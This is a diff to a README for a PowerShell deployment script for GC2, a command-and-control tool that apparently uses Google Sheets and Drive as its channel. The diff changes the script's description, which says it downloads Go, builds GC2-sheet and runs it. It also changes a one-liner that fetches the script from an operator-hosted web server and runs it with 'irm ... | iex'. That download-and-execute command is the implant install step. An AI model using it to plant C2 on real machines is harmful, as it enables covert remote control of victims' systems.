@@ -8,7 +8,7 @@ GC2 (Google Command and Control) is a Command and Control application that allow
 
 # My Contribution
 
-A Powershell script that downloads go, adds it to the user's path, downloads the zip from the repository "looCiprian/GC2-sheet", builds the executable, and runs gc2-sheet. Note: requires a web server to host the #MY_KEY_JSON file to Invoke-Webrequest down, #MY_SHEET_ID, and #MY_DRIVE_ID to be incorporated into the PS1. Additionally, PowershellScript-GC-2.ps1 can be hosted from the same webserver and requested with Invoke-RestMethod or Invoke-WebRequest.
+A Powershell script that downloads go, adds it to the user's path, downloads the zip from the repository "looCiprian/GC2-sheet", builds the executable, and runs gc2-sheet. Note: requires a web server to host the #MY_KEY_JSON file to Invoke-Webrequest down, #MY_SHEET_ID, and #MY_DRIVE_ID to be incorporated into the PS1. Additionally, PowershellScript-GC-2.ps1 can be hosted from the same webserver and requested with Invoke-WebRequest.
 
 # Why
 
@@ -73,7 +73,7 @@ Furthermore, the program will interact only with Google's domains (*.google.com)
 
    If you have a web server hosting your MY_KEY_JSON file and running on Windows, use:
    ```Powershell
-   irm "http://$myUrl/PowershellScript-GC-2.ps1" | iex
+   irm http://$myUrl/PowershellScript-GC-2.ps1 -usebasicparsing | iex
    ```
 
    Or Linux the below commands. If the configuration file has been modified just run:
